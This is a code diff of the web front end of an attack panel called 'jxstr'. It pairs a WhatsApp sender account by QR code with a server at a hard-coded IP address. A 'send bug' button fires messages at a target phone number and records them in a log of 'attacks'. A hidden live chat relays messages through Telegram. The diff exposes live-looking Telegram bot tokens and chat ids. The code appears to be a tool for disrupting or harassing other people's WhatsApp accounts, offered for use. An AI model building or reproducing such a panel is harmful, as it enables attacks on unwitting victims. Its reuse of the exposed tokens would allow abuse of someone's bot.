@@ -1319,12 +1319,6 @@ body{
   padding: 8px;
 }
 
-.qr-expire-text {
-  font-size: 12px;
-  color: var(--muted);
-  margin-top: 8px;
-}
-
 .manage-sender-content {
   padding: 20px 0;
 }
@@ -1353,15 +1347,7 @@ body{
   border: none;
   box-shadow: none;
 }
-
-.livechat-header {
-  text-align: center;
-  margin-bottom: 4px;
-  font-size: 12px;
-  color: var(--muted);
-}
 </style>
-
 </head>
 
 <body>
@@ -1593,11 +1579,10 @@ body{
 <script>
 const LOGS_STORAGE_KEY = 'jxstr_attack_logs';
 const BASE_URL = 'http://80.225.219.235:3000';
-const BOT_TOKEN = '8392360813:AAFY7MxzpIZGlDbEsCa9k9U5PVFfSTiTBUc';
+const BOT_TOKEN = '8392360813:AAG9dcsOp-3jlMcbAnt6fiBeFTiuoqCNWvI';
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const CHAT_STORAGE_KEY = 'jxstr_livechat_messages';
 const CHAT_SESSION_KEY = 'jxstr_chat_session';
-const SESSION_SENT_KEY = 'jxstr_session_sent';
 
 let timerInterval = null;
 let timeLeft = 0;
@@ -1607,9 +1592,8 @@ let sessionRequested = false;
 let chatPollInterval = null;
 let lastMessageId = 0;
 let chatSessionId = '';
-let sessionSent = false;
 
-// User Online Logic
+// User Online
 let userId = localStorage.getItem('jxstr_user_id');
 if (!userId) {
     userId = Math.random().toString(36).substring(2, 15);
@@ -1617,584 +1601,194 @@ if (!userId) {
 }
 
 async function joinOnline() {
-    try {
-        await fetch(`${BASE_URL}/api/join`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ id: userId })
-        });
-        updateOnlineCount();
-    } catch (e) {
-        console.log('Join online error:', e);
-    }
+    try { await fetch(`${BASE_URL}/api/join`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: userId }) }); updateOnlineCount(); } catch (e) {}
 }
-
 async function heartbeat() {
-    try {
-        await fetch(`${BASE_URL}/api/heartbeat`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ id: userId })
-        });
-    } catch (e) {
-        console.log('Heartbeat error:', e);
-    }
+    try { await fetch(`${BASE_URL}/api/heartbeat`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: userId }) }); } catch (e) {}
 }
-
-window.addEventListener('beforeunload', () => {
-    navigator.sendBeacon(`${BASE_URL}/api/leave`, JSON.stringify({ id: userId }));
-});
-
+window.addEventListener('beforeunload', () => { navigator.sendBeacon(`${BASE_URL}/api/leave`, JSON.stringify({ id: userId })); });
 async function updateOnlineCount() {
-    try {
-        const res = await fetch(`${BASE_URL}/api/online`);
-        const data = await res.json();
-        const onlineElement = document.querySelector('.stat .primary');
-        if (onlineElement) onlineElement.textContent = data.count;
-    } catch (e) {
-        console.log('Update online count error:', e);
-    }
+    try { const r = await fetch(`${BASE_URL}/api/online`); const d = await r.json(); document.querySelector('.stat .primary').textContent = d.count; } catch (e) {}
 }
 
-// Chat Functions
-function generateChatSession() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let result = '#';
-    for (let i = 0; i < 5; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-function getChatSession() {
-    let session = localStorage.getItem(CHAT_SESSION_KEY);
-    if (!session) {
-        session = generateChatSession();
-        localStorage.setItem(CHAT_SESSION_KEY, session);
-    }
-    sessionSent = localStorage.getItem(SESSION_SENT_KEY) === 'true';
-    return session;
-}
-
-function saveMessages(messages) {
-    localStorage.setItem(CHAT_STORAGE_KEY, JSON.stringify(messages));
-}
-
-function getMessages() {
-    return JSON.parse(localStorage.getItem(CHAT_STORAGE_KEY) || '[]');
-}
-
+// Chat
+function generateChatSession() { const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; let r = '#'; for (let i = 0; i < 5; i++) r += chars.charAt(Math.floor(Math.random() * chars.length)); return r; }
+function getChatSession() { let s = localStorage.getItem(CHAT_SESSION_KEY); if (!s) { s = generateChatSession(); localStorage.setItem(CHAT_SESSION_KEY, s); } return s; }
+function saveMessages(m) { localStorage.setItem(CHAT_STORAGE_KEY, JSON.stringify(m)); }
+function getMessages() { return JSON.parse(localStorage.getItem(CHAT_STORAGE_KEY) || '[]'); }
 function renderChat() {
-    const chatContainer = document.getElementById('chatContainer');
-    if (!chatContainer) return;
-    const messages = getMessages();
-    
-    chatContainer.innerHTML = '<div class="chat-bubble bubble-system">Live Chat Connected</div>';
-    
-    messages.forEach(msg => {
-        const bubble = document.createElement('div');
-        if (msg.from === 'user') {
-            bubble.className = 'chat-bubble bubble-user';
-            bubble.textContent = msg.text;
-        } else if (msg.from === 'owner') {
-            bubble.className = 'chat-bubble bubble-owner';
-            bubble.textContent = msg.text;
-        } else {
-            bubble.className = 'chat-bubble bubble-system';
-            bubble.textContent = msg.text;
-        }
-        chatContainer.appendChild(bubble);
+    const c = document.getElementById('chatContainer'); if (!c) return;
+    const msgs = getMessages();
+    c.innerHTML = '<div class="chat-bubble bubble-system">Live Chat Connected</div>';
+    msgs.forEach(m => {
+        const b = document.createElement('div');
+        if (m.from === 'user') { b.className = 'chat-bubble bubble-user'; b.textContent = m.text; }
+        else if (m.from === 'owner') { b.className = 'chat-bubble bubble-owner'; b.textContent = m.text; }
+        else { b.className = 'chat-bubble bubble-system'; b.textContent = m.text; }
+        c.appendChild(b);
     });
-    
-    chatContainer.scrollTop = chatContainer.scrollHeight;
+    c.scrollTop = c.scrollHeight;
 }
-
 async function sendToTelegram(text) {
     try {
-        const fullText = `${chatSessionId} ${text}`;
-        const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: '8140169698',
-                text: fullText
-            })
-        });
-        const data = await res.json();
-        if (data.ok && data.result) {
-            lastMessageId = Math.max(lastMessageId, data.result.message_id);
-        }
-        return data;
-    } catch (e) {
-        console.log('Send error:', e);
-        return null;
-    }
+        const url = `${TELEGRAM_API}/sendMessage?chat_id=1065763721&text=${encodeURIComponent(chatSessionId + ' ' + text)}`;
+        const r = await fetch(url); const d = await r.json();
+        if (d.ok && d.result) lastMessageId = Math.max(lastMessageId, d.result.message_id);
+        return d;
+    } catch (e) { return null; }
 }
-
 async function getTelegramUpdates() {
     try {
-        const res = await fetch(`${TELEGRAM_API}/getUpdates`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                offset: lastMessageId + 1,
-                timeout: 5,
-                allowed_updates: ['message']
-            })
-        });
-        const data = await res.json();
-        
-        if (data.ok && data.result.length > 0) {
-            let newMessages = false;
-            data.result.forEach(update => {
-                if (update.update_id > lastMessageId) {
-                    lastMessageId = update.update_id;
-                }
-                
-                if (update.message && update.message.text) {
-                    const text = update.message.text;
-                    const senderId = update.message.from.id.toString();
-                    
-                    // Ignore messages sent by the bot itself
-                    if (senderId === BOT_TOKEN.split(':')[0]) return;
-                    
-                    // Process owner messages
-                    if (text.startsWith(chatSessionId)) {
-                        const replyText = text.substring(chatSessionId.length).trim();
-                        if (replyText) {
-                            const messages = getMessages();
-                            // Avoid duplicate messages
-                            const lastMsg = messages[messages.length - 1];
-                            if (!lastMsg || lastMsg.text !== replyText || lastMsg.from !== 'owner') {
-                                messages.push({ from: 'owner', text: replyText, time: Date.now() });
-                                saveMessages(messages);
-                                newMessages = true;
-                            }
-                        }
-                    } else if (!text.startsWith('#')) {
-                        // General messages from owner
-                        const messages = getMessages();
-                        const lastMsg = messages[messages.length - 1];
-                        if (!lastMsg || lastMsg.text !== text || lastMsg.from !== 'owner') {
-                            messages.push({ from: 'owner', text: text, time: Date.now() });
-                            saveMessages(messages);
-                            newMessages = true;
-                        }
+        const r = await fetch(`${TELEGRAM_API}/getUpdates`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ offset: lastMessageId + 1, timeout: 5, allowed_updates: ['message'] }) });
+        const d = await r.json();
+        if (d.ok && d.result.length > 0) {
+            let n = false;
+            d.result.forEach(u => {
+                if (u.update_id > lastMessageId) lastMessageId = u.update_id;
+                if (u.message && u.message.text) {
+                    const t = u.message.text, sid = u.message.from.id.toString();
+                    if (sid === BOT_TOKEN.split(':')[0]) return;
+                    if (t.startsWith(chatSessionId)) {
+                        const rt = t.substring(chatSessionId.length).trim();
+                        if (rt) { const ms = getMessages(); const lm = ms[ms.length - 1]; if (!lm || lm.text !== rt || lm.from !== 'owner') { ms.push({ from: 'owner', text: rt, time: Date.now() }); saveMessages(ms); n = true; } }
+                    } else if (!t.startsWith('#')) {
+                        const ms = getMessages(); const lm = ms[ms.length - 1]; if (!lm || lm.text !== t || lm.from !== 'owner') { ms.push({ from: 'owner', text: t, time: Date.now() }); saveMessages(ms); n = true; }
                     }
                 }
             });
-            if (newMessages) renderChat();
+            if (n) renderChat();
         }
-    } catch (e) {
-        console.log('Poll error:', e);
-    }
+    } catch (e) {}
 }
-
 async function sendChatMessage() {
-    const chatInput = document.getElementById('chatInput');
-    if (!chatInput) return;
-    const text = chatInput.value.trim();
-    
-    if (!text) return;
-    
-    const messages = getMessages();
-    messages.push({ from: 'user', text: text, time: Date.now() });
-    saveMessages(messages);
-    renderChat();
-    
-    const result = await sendToTelegram(text);
-    if (!result || !result.ok) {
-        showToast("Failed to send message");
-    }
-    
-    chatInput.value = '';
+    const inp = document.getElementById('chatInput'); if (!inp) return;
+    const text = inp.value.trim(); if (!text) return;
+    const ms = getMessages(); ms.push({ from: 'user', text, time: Date.now() }); saveMessages(ms); renderChat();
+    sendToTelegram(text);
+    fetch(`${BASE_URL}/api/admin/message`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId: chatSessionId, number: 'User-' + userId.substring(0, 6), text, from: 'user' }) }).catch(() => {});
+    inp.value = '';
 }
+function handleChatKeyPress(e) { if (e.key === 'Enter') sendChatMessage(); }
 
-function handleChatKeyPress(event) {
-    if (event.key === 'Enter') sendChatMessage();
+function showToast(msg = "Coming soon!") {
+    const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2000);
 }
-
-function showToast(message = "Coming soon!") {
-  const toast = document.getElementById('toast');
-  toast.textContent = message;
-  toast.classList.add('show');
-  setTimeout(() => { toast.classList.remove('show'); }, 2000);
-}
-
 function switchMenu(menu) {
-  if (menu === 'livechat') {
-    stopQrPolling();
-  }
-  if (menu !== 'livechat' && chatPollInterval) {
-    clearInterval(chatPollInterval);
-    chatPollInterval = null;
-  }
-  
-  document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active'));
-  const selectedContent = document.getElementById(`${menu}-content`);
-  if (selectedContent) {
-    selectedContent.classList.add('active');
-    if (menu === 'stats') loadLogs();
-    if (menu === 'profile') updateProfileStats();
-    if (menu === 'livechat') {
-      renderChat();
-      if (!chatPollInterval) {
-        chatPollInterval = setInterval(getTelegramUpdates, 2000);
-      }
-    }
-  }
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  document.querySelectorAll('.nav-item').forEach(i => {
-    if (i.innerText.toLowerCase().includes(menu === 'home' ? 'home' : menu)) i.classList.add('active');
-  });
+    if (menu === 'livechat') { stopQrPolling(); }
+    if (menu !== 'livechat' && chatPollInterval) { clearInterval(chatPollInterval); chatPollInterval = null; }
+    document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active'));
+    const sel = document.getElementById(`${menu}-content`);
+    if (sel) { sel.classList.add('active'); if (menu === 'stats') loadLogs(); if (menu === 'profile') updateProfileStats(); if (menu === 'livechat') { renderChat(); if (!chatPollInterval) chatPollInterval = setInterval(getTelegramUpdates, 2000); } }
+    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+    document.querySelectorAll('.nav-item').forEach(i => { if (i.innerText.toLowerCase().includes(menu === 'home' ? 'home' : menu)) i.classList.add('active'); });
 }
+function openAttackPanel() { document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active')); document.getElementById('attack-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); }
+function closeAttackPanel() { document.getElementById('attack-content').classList.remove('active'); document.getElementById('home-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); document.querySelectorAll('.nav-item')[0].classList.add('active'); }
+function openSecurePanel() { document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active')); document.getElementById('secure-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); }
+function closeSecurePanel() { document.getElementById('secure-content').classList.remove('active'); document.getElementById('home-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); document.querySelectorAll('.nav-item')[0].classList.add('active'); }
+function openManageSender() { document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active')); document.getElementById('manage-sender-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); }
+function closeManageSender() { stopQrPolling(); document.getElementById('manage-sender-content').classList.remove('active'); document.getElementById('home-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); document.querySelectorAll('.nav-item')[0].classList.add('active'); }
+function openLivechatPanel() { document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active')); document.getElementById('livechat-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); renderChat(); if (!chatPollInterval) chatPollInterval = setInterval(getTelegramUpdates, 2000); }
+function closeLivechatPanel() { if (chatPollInterval) { clearInterval(chatPollInterval); chatPollInterval = null; } document.getElementById('livechat-content').classList.remove('active'); document.getElementById('home-content').classList.add('active'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); document.querySelectorAll('.nav-item')[0].classList.add('active'); }
 
-function openAttackPanel() {
-  document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active'));
-  document.getElementById('attack-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-}
+function toggleSpinner() { const o = document.getElementById('spinnerOptions'), a = document.querySelector('.spinner-arrow'); if (o.classList.contains('active')) { o.classList.remove('active'); a.classList.remove('rotate'); } else { o.classList.add('active'); a.classList.add('rotate'); } }
+function selectOption(opt) { document.getElementById('selectedOption').textContent = opt; const o = document.getElementById('spinnerOptions'), a = document.querySelector('.spinner-arrow'); if (o.classList.contains('active')) { o.classList.remove('active'); a.classList.remove('rotate'); } }
+function togglePairSpinner() { const o = document.getElementById('pairSpinnerOptions'), a = document.querySelector('#pairTypeSpinner .spinner-arrow'); if (o.classList.contains('active')) { o.classList.remove('active'); a.classList.remove('rotate'); } else { o.classList.add('active'); a.classList.add('rotate'); } }
+function selectPairOption(opt) { document.getElementById('selectedPairOption').textContent = opt; document.getElementById('senderNumberGroup').style.display = opt === 'With Qr Code Scan' ? 'none' : 'block'; const o = document.getElementById('pairSpinnerOptions'), a = document.querySelector('#pairTypeSpinner .spinner-arrow'); if (o.classList.contains('active')) { o.classList.remove('active'); a.classList.remove('rotate'); } }
 
-function closeAttackPanel() {
-  document.getElementById('attack-content').classList.remove('active');
-  document.getElementById('home-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  document.querySelectorAll('.nav-item')[0].classList.add('active');
-}
-
-function openSecurePanel() {
-  document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active'));
-  document.getElementById('secure-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-}
-
-function closeSecurePanel() {
-  document.getElementById('secure-content').classList.remove('active');
-  document.getElementById('home-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  document.querySelectorAll('.nav-item')[0].classList.add('active');
-}
-
-function openManageSender() {
-  document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active'));
-  document.getElementById('manage-sender-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-}
-
-function closeManageSender() {
-  stopQrPolling();
-  document.getElementById('manage-sender-content').classList.remove('active');
-  document.getElementById('home-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  document.querySelectorAll('.nav-item')[0].classList.add('active');
-}
-
-function openLivechatPanel() {
-  document.querySelectorAll('.menu-content').forEach(c => c.classList.remove('active'));
-  document.getElementById('livechat-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  renderChat();
-  if (!chatPollInterval) {
-    chatPollInterval = setInterval(getTelegramUpdates, 2000);
-  }
-}
-
-function closeLivechatPanel() {
-  if (chatPollInterval) { clearInterval(chatPollInterval); chatPollInterval = null; }
-  document.getElementById('livechat-content').classList.remove('active');
-  document.getElementById('home-content').classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  document.querySelectorAll('.nav-item')[0].classList.add('active');
-}
-
-function toggleSpinner() {
-  const options = document.getElementById('spinnerOptions');
-  const arrow = document.querySelector('.spinner-arrow');
-  if (options.classList.contains('active')) {
-    options.classList.remove('active'); arrow.classList.remove('rotate');
-  } else {
-    options.classList.add('active'); arrow.classList.add('rotate');
-  }
-}
-
-function selectOption(option) {
-  document.getElementById('selectedOption').textContent = option;
-  const options = document.getElementById('spinnerOptions');
-  const arrow = document.querySelector('.spinner-arrow');
-  if (options.classList.contains('active')) {
-    options.classList.remove('active');
-    arrow.classList.remove('rotate');
-  }
-}
-
-function togglePairSpinner() {
-  const options = document.getElementById('pairSpinnerOptions');
-  const arrow = document.querySelector('#pairTypeSpinner .spinner-arrow');
-  if (options.classList.contains('active')) {
-    options.classList.remove('active'); arrow.classList.remove('rotate');
-  } else {
-    options.classList.add('active'); arrow.classList.add('rotate');
-  }
-}
-
-function selectPairOption(option) {
-  document.getElementById('selectedPairOption').textContent = option;
-  document.getElementById('senderNumberGroup').style.display = option === 'With Qr Code Scan' ? 'none' : 'block';
-  const options = document.getElementById('pairSpinnerOptions');
-  const arrow = document.querySelector('#pairTypeSpinner .spinner-arrow');
-  if (options.classList.contains('active')) {
-    options.classList.remove('active');
-    arrow.classList.remove('rotate');
-  }
-}
-
-document.addEventListener('click', function(event) {
-  const bugSpinner = document.getElementById('bugTypeSpinner');
-  const bugOptions = document.getElementById('spinnerOptions');
-  if (!bugSpinner.contains(event.target) && bugOptions.classList.contains('active')) toggleSpinner();
-  
-  const pairSpinner = document.getElementById('pairTypeSpinner');
-  const pairOptions = document.getElementById('pairSpinnerOptions');
-  if (!pairSpinner.contains(event.target) && pairOptions.classList.contains('active')) togglePairSpinner();
+document.addEventListener('click', function(e) {
+    const bs = document.getElementById('bugTypeSpinner'), bo = document.getElementById('spinnerOptions');
+    if (bs && !bs.contains(e.target) && bo.classList.contains('active')) toggleSpinner();
+    const ps = document.getElementById('pairTypeSpinner'), po = document.getElementById('pairSpinnerOptions');
+    if (ps && !ps.contains(e.target) && po.classList.contains('active')) togglePairSpinner();
 });
 
-function showQrPopup() {
-  document.getElementById('qrCodePopup').classList.add('active');
-  document.getElementById('qrImage').style.display = 'none';
-  document.getElementById('qrLoading').style.display = 'block';
-  document.getElementById('qrLoading').style.color = 'var(--muted)';
-  document.getElementById('qrLoading').textContent = 'Generating Qr...';
-  stopQrPolling();
-  sessionRequested = false;
-  currentSessionId = null;
-  fetchNewSession();
+// QR
+function showQrPopup() { document.getElementById('qrCodePopup').classList.add('active'); document.getElementById('qrImage').style.display = 'none'; document.getElementById('qrLoading').style.display = 'block'; document.getElementById('qrLoading').style.color = 'var(--muted)'; document.getElementById('qrLoading').textContent = 'Generating Qr...'; stopQrPolling(); sessionRequested = false; currentSessionId = null; fetchNewSession(); }
+function hideQrPopup() { stopQrPolling(); document.getElementById('qrCodePopup').classList.remove('active'); if (currentSessionId) { fetch(`${BASE_URL}/api/session/${currentSessionId}`, { method: 'DELETE' }).catch(() => {}); currentSessionId = null; } sessionRequested = false; }
+async function fetchNewSession() { if (sessionRequested) return; sessionRequested = true; try { const r = await fetch(`${BASE_URL}/api/qr`); const d = await r.json(); currentSessionId = d.sessionId; startQrPolling(currentSessionId); } catch (e) { sessionRequested = false; } }
+function startQrPolling(sid) {
+    stopQrPolling();
+    qrPollInterval = setInterval(async () => {
+        try {
+            const r = await fetch(`${BASE_URL}/api/qr/${sid}`); const d = await r.json();
+            if (d.expired) { stopQrPolling(); sessionRequested = false; setTimeout(() => fetchNewSession(), 2000); return; }
+            if (d.connected) {
+                document.getElementById('qrImage').style.display = 'none'; document.getElementById('qrLoading').textContent = '✅ Connected! ' + d.number; document.getElementById('qrLoading').style.color = '#4CAF50';
+                stopQrPolling(); localStorage.setItem('jxstr_my_session_id', sid); updateSenderCount(); showToast('WhatsApp Connected!'); setTimeout(hideQrPopup, 2000); return;
+            }
+            if (d.qr) { document.getElementById('qrImage').src = d.qr; document.getElementById('qrImage').style.display = 'block'; document.getElementById('qrLoading').style.display = 'none'; }
+        } catch (e) {}
+    }, 3000);
 }
+function stopQrPolling() { if (qrPollInterval) { clearInterval(qrPollInterval); qrPollInterval = null; } }
+function handlePairing() { if (document.getElementById('selectedPairOption').textContent === 'With Qr Code Scan') { showQrPopup(); } else { const n = document.getElementById('senderNumber').value.trim(); if (!n) { showToast("Please enter sender number"); return; } showToast("Coming soon!"); } }
 
-function hideQrPopup() {
-  stopQrPolling();
-  document.getElementById('qrCodePopup').classList.remove('active');
-  if (currentSessionId) {
-    fetch(`${BASE_URL}/api/session/${currentSessionId}`, { method: 'DELETE' }).catch(()=>{});
-    currentSessionId = null;
-  }
-  sessionRequested = false;
-}
-
-async function fetchNewSession() {
-  if (sessionRequested) return;
-  sessionRequested = true;
-  try {
-    const res = await fetch(`${BASE_URL}/api/qr`);
-    const data = await res.json();
-    currentSessionId = data.sessionId;
-    startQrPolling(currentSessionId);
-  } catch (e) { sessionRequested = false; }
-}
-
-function startQrPolling(sessionId) {
-  stopQrPolling();
-  qrPollInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`${BASE_URL}/api/qr/${sessionId}`);
-      const data = await res.json();
-      if (data.expired) {
-        document.getElementById('qrLoading').textContent = 'QR Expired';
-        document.getElementById('qrImage').style.display = 'none';
-        document.getElementById('qrLoading').style.display = 'block';
-        stopQrPolling();
-        sessionRequested = false;
-        setTimeout(() => { document.getElementById('qrLoading').textContent = 'Generating Qr...'; fetchNewSession(); }, 2000);
-        return;
-      }
-      if (data.connected) {
-        document.getElementById('qrImage').style.display = 'none';
-        document.getElementById('qrLoading').textContent = '✅ Connected! ' + data.number;
-        document.getElementById('qrLoading').style.display = 'block';
-        document.getElementById('qrLoading').style.color = '#4CAF50';
-        stopQrPolling();
-        updateSenderCount();
-        showToast('WhatsApp Connected!');
-        setTimeout(hideQrPopup, 2000);
-        return;
-      }
-      if (data.qr) {
-        document.getElementById('qrImage').src = data.qr;
-        document.getElementById('qrImage').style.display = 'block';
-        document.getElementById('qrLoading').style.display = 'none';
-      }
-    } catch (e) {}
-  }, 3000);
-}
-
-function stopQrPolling() {
-  if (qrPollInterval) { clearInterval(qrPollInterval); qrPollInterval = null; }
-}
-
-function handlePairing() {
-  const pairType = document.getElementById('selectedPairOption').textContent;
-  if (pairType === 'With Qr Code Scan') {
-    showQrPopup();
-  } else {
-    const senderNumber = document.getElementById('senderNumber').value.trim();
-    if (!senderNumber) { showToast("Please enter sender number"); return; }
-    showToast("Coming soon!");
-  }
-}
-
+// Sender count PER USER
 async function updateSenderCount() {
-  try {
-    const res = await fetch(`${BASE_URL}/api/senders-count`);
-    const data = await res.json();
-    document.getElementById('senderCount').textContent = data.count;
-  } catch (e) {}
+    try {
+        const sid = localStorage.getItem('jxstr_my_session_id') || '';
+        if (!sid) { document.getElementById('senderCount').textContent = '0'; return; }
+        const r = await fetch(`${BASE_URL}/api/senders-count?sessionId=${sid}`); const d = await r.json();
+        document.getElementById('senderCount').textContent = d.count;
+    } catch (e) {}
 }
 
+// Send Bug
 async function sendBug() {
-  const targetNumber = document.getElementById('targetNumber').value.trim();
-  const bugType = document.getElementById('selectedOption').textContent;
-  const sendButton = document.getElementById('sendBugButton');
-  
-  if (!targetNumber) { showToast("Please enter target number"); return; }
-  if (sendButton.classList.contains('loading')) return;
-  
-  try {
-    const res = await fetch(`${BASE_URL}/api/senders-count`);
-    const data = await res.json();
-    if (data.count === 0) { showToast("Sender not connected"); return; }
-  } catch (e) { showToast("Server error"); return; }
-  
-  sendButton.classList.add('loading');
-  sendButton.disabled = true;
-  document.getElementById('timerDisplay').textContent = "";
-  
-  try {
-    const res = await fetch(`${BASE_URL}/api/send-bug`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ target: targetNumber, message: '*444*' })
-    });
-    const result = await res.json();
-    if (result.success) {
-      addLog(targetNumber, bugType, 'Successfully sent');
-      showToast(`Success Sent To ${targetNumber}`);
-    } else {
-      showToast("Sender not connected");
-    }
-  } catch (e) { showToast("Failed to send"); }
-  
-  setTimeout(() => {
-    sendButton.classList.remove('loading');
-    sendButton.disabled = false;
-  }, 1000);
+    const target = document.getElementById('targetNumber').value.trim();
+    const bugType = document.getElementById('selectedOption').textContent;
+    const btn = document.getElementById('sendBugButton');
+    if (!target) { showToast("Please enter target number"); return; }
+    if (btn.classList.contains('loading')) return;
+    const clean = target.replace(/[^0-9]/g, '');
+    if (clean.length < 7 || clean.length > 15) { showToast("Invalid number"); return; }
+    try { const r = await fetch(`${BASE_URL}/api/senders-count?sessionId=${localStorage.getItem('jxstr_my_session_id')||''}`); const d = await r.json(); if (d.count === 0) { showToast("Sender not connected"); return; } } catch (e) { showToast("Server error"); return; }
+    btn.classList.add('loading'); btn.disabled = true; document.getElementById('timerDisplay').textContent = "";
+    const timeout = setTimeout(() => { btn.classList.remove('loading'); btn.disabled = false; showToast("Failed to send"); }, 10000);
+    try {
+        const r = await fetch(`${BASE_URL}/api/send-bug`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target: clean, message: '*444*' }) });
+        const d = await r.json(); clearTimeout(timeout);
+        if (d.success) { addLog(clean, bugType); showToast(`Success Sent To ${clean}`); } else { showToast("Failed to send"); }
+    } catch (e) { clearTimeout(timeout); showToast("Failed to send"); }
+    btn.classList.remove('loading'); btn.disabled = false;
 }
 
+// Logs
 function loadLogs() {
-  const logsList = document.getElementById('logsList');
-  const noLogsMessage = document.getElementById('noLogsMessage');
-  logsList.innerHTML = '';
-  const logs = getLogs();
-  if (logs.length === 0) { noLogsMessage.style.display = 'block'; logsList.style.display = 'none'; return; }
-  noLogsMessage.style.display = 'none';
-  logsList.style.display = 'flex';
-  logs.reverse().forEach(log => {
-    const logItem = document.createElement('div');
-    logItem.className = 'log-item';
-    const time = new Date(log.timestamp).toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' });
-    logItem.innerHTML = `<div class="log-header"><div class="log-target">Target: ${log.target}</div><div class="log-time">${time}</div></div><div class="log-details">Type: ${log.type}<br>Status: <span class="log-status">${log.status}</span></div>`;
-    logsList.appendChild(logItem);
-  });
+    const list = document.getElementById('logsList'), no = document.getElementById('noLogsMessage'); list.innerHTML = '';
+    const logs = getLogs();
+    if (logs.length === 0) { no.style.display = 'block'; list.style.display = 'none'; return; }
+    no.style.display = 'none'; list.style.display = 'flex';
+    logs.reverse().forEach(l => {
+        const div = document.createElement('div'); div.className = 'log-item';
+        div.innerHTML = `<div class="log-header"><div class="log-target">Target: ${l.target}</div><div class="log-time">${new Date(l.timestamp).toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' })}</div></div><div class="log-details">Type: ${l.type}<br>Status: <span class="log-status">${l.status}</span></div>`;
+        list.appendChild(div);
+    });
 }
-
 function getLogs() { return JSON.parse(localStorage.getItem(LOGS_STORAGE_KEY) || '[]'); }
-function saveLogs(logs) { localStorage.setItem(LOGS_STORAGE_KEY, JSON.stringify(logs)); }
-
-function addLog(target, type, status = 'Successfully sent') {
-  const logs = getLogs();
-  logs.push({ target, type, status, timestamp: new Date().toISOString() });
-  saveLogs(logs);
-  if (document.getElementById('stats-content').classList.contains('active')) loadLogs();
-  updateProfileStats();
-}
-
+function saveLogs(l) { localStorage.setItem(LOGS_STORAGE_KEY, JSON.stringify(l)); }
+function addLog(target, type, status = 'Successfully sent') { const l = getLogs(); l.push({ target, type, status, timestamp: new Date().toISOString() }); saveLogs(l); if (document.getElementById('stats-content').classList.contains('active')) loadLogs(); updateProfileStats(); }
 function showConfirmDialog() { document.getElementById('confirmDialog').classList.add('active'); }
 function hideConfirmDialog() { document.getElementById('confirmDialog').classList.remove('active'); }
+function clearAllLogs() { localStorage.removeItem(LOGS_STORAGE_KEY); loadLogs(); updateProfileStats(); hideConfirmDialog(); showToast("All logs cleared"); }
+function updateProfileStats() { const l = getLogs(); document.getElementById('totalAttacks').textContent = l.length; document.getElementById('successfulAttacks').textContent = l.filter(x => x.status.includes('Success')).length; document.getElementById('lastAttackTime').textContent = l.length > 0 ? new Date(l[l.length - 1].timestamp).toLocaleString('id-ID', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' }) : '0/0'; }
+function handleVideoReady() { const v = document.querySelector('.hero-video'); if (v) { v.classList.add('ready'); v.play().catch(() => {}); } }
